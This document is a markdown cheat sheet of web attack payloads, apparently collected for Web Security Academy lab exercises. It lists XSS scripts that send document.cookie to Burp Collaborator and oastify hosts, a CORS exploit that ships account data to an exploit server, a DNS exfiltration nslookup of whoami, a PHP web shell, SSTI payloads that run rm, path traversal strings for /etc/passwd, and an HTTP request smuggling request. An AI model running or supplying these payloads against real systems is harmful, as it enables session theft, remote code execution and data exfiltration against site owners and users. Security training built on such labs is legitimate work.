
#XSS 
```bash
# -------------- XXS--------------------
# Steal cookies
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

# with <img src>
<img src=x onerror='document.location="https://yrt59itnshravcprwid3a3rppgv7jx7m.oastify.com/?cookies="+document.cookie'>

# get string in response regex
<img src=x onerror='document.location="https://yrt59itnshravcprwid3a3rppgv7jx7m.oastify.com/?cookies="+document.body.innerHTML.match(/sessionId\"(.*?),/)[0]'>

```

#php
```
# ------------------- PHP ---------------------
# PHP filter get output in base64 format, then use base64 decode to read fle
GET /admin.php?footer=php://filter/convert.base64-encode/resource=dev/test.php

# get file with php
<?php echo file_get_contents('/path/to/target/file'); ?>

# get command
<?php echo system($_GET['cmd']); ?>

# bypass php deny list with .htaccess
filename=".htaccess"
Content-Type: text/plain
# add .shell files to be executed as php
AddType application/x-httpd-php .shell

# dir traversal upload to to /etc/apache2/apache2.conf - allows php to be executed
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

#xxe
```bash
# classic SVG XXE
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

```

#file-upload
```bash
#magic bytes
## JPEG begins with
FF D8 FF

```

#click-jacking
```html
# modify the height and button values accordingly
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```


#cors-poc
```js
<script>
var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
    req.withCredentials = true;
    req.send();
    function reqListener() 
    {
    	location='https://https://exploit-0a330031033ca46cc12e662601330023.exploit-server.net/log?key='+this.responseText; 
    };
</script>
```

#ssrf 
```bash
# list of different way to write 127.0.0.1
0x7f000001 #hex
01111111000000000000000000000001 # binary 
2130706433 #decimal
localhost  
::1 #IPv6
127.0.0.1
127.0.0.1:80
http://127.0.0.1
http://127.0.0.1:8080
::1
http://::1
http://::1:8080


# SSRF with whitelist-based input filters
https://expected-host@evil-host
https://evil-host#expected-host
https://expected-host.evil-host
# double URL encode

```


#ssti 
```
#fuzzing to detect, use characters like
${{<%[%'"}}%\
{% somePython_ruby_or_other_language_to_identify_whats_is_used %}

# Embedded ruby based
<%= 7*7 %>
<%= system("cat /home/carlos/morale.txt") %>
#URL (before url encode):
/?message=<%= system("rm /home/carlos/morale.txt") %>


# python based - RCE
<%
	import os
	x=os.popen('id').read()
	%>
	${x}

# python based - RCE 2
{% import os %} 
{{os.system('rm /home/carlos/morale.txt')

# URL:
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```


#directory-traversal
```http
../../../etc/passwd
../../../etc/hosts
../../../etc/hostname
..\..\..\windows\win.ini

....//....//....//etc/passwd
....\/
bn
/var/www/images/../../../etc/passwd

..%252f..%252f..%252fetc/passwd

```

#rce 
```bash
# OOB RCE via DNS - results will show on DNS query
nslookup `whoami`.kgji2ohoyw.web-attacker.com 
```


#jwt
```bash
# list for bruteforcing weak JWT signing key
https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```


#http-smuggling
```bash
# CL.TE
## poisoning the backend for writing out victim's GET/POST requests

POST / HTTP/1.1
Host: 0ae500370374c527c080185f00640012.web-security-academy.net
Cookie: session=tGQJr2uo0xXMz6f9bLFmQwzYS2eFgsEV
Content-Length: 289
Origin: https://0ae500370374c527c080185f00640012.web-security-academy.net
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=tGQJr2uo0xXMz6f9bLFmQwzYS2eFgsEV
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

csrf=o4Wtm4Wj25J2ACk6gUrOYOqzGamfcl1f&postId=10&name=test&email=asdjalsd%40asdjad.com&website=http%3A%2F%2Fwww.test.com&comment=test


```